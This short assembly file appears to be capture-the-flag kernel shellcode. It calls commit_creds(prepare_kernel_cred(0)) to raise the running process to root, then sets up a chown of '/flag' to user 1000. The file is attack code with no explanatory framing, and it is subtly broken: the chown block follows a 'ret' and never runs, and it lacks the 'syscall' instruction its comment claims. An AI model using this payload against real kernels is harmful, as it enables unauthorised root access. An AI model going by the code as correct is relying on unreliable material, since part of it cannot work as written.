.global _start
.intel_syntax noprefix
_start:
	xor rdi, rdi
	call prepare_kernel_cred
	mov rdi, rax
	call commit_creds
	ret
	mov rbx, 0x00000067616c662f
	push rbx
	mov rax, 92				# syscall number of chown
	mov rdi, rsp				# point the first argument at stack (where we have "/flag")
	mov rsi, 1000				# new uid 1000
	mov rdx, 1000				# new group id 1000
					        # trigger chown("/flag", 1000, 1000)
	ret
